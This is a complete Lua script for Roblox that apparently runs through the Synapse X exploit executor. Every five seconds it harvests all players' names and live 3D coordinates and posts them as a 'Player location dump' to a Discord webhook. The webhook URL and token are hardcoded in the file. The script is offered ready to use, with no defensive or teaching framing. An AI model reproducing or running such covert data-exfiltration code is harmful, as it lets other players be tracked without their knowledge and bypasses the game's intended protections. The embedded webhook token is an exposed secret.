-- Synapse X only
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Set your webhook URL here
local WEBHOOK_URL = "https://discord.com/api/webhooks/1386476426525544579/O45syI_PlvdNR8vLDPyCZgcY2Rcs-PfbMx-JSiI6j0Q0GXcW3TmMqV_Yw54RQ_kGaFRt"

local function sendPlayerData()
    local data = {}

    for _, player in ipairs(Players:GetPlayers()) do
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local pos = character.HumanoidRootPart.Position
            table.insert(data, {
                name = player.Name,
                x = pos.X,
                y = pos.Y,
                z = pos.Z
            })
        end
    end

    local payload = HttpService:JSONEncode({
        username = "Minimap Logger",
        content = "Player location dump",
        embeds = {{
            title = "Player Coordinates",
            description = "Map updated.",
            color = 65280,
            fields = {{
                name = "Data",
                value = "```json\n" .. HttpService:JSONEncode(data) .. "\n```"
            }}
        }}
    })

    syn.request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
end

-- Run every 5 seconds
while true do
    pcall(sendPlayerData)
    wait(5)
end
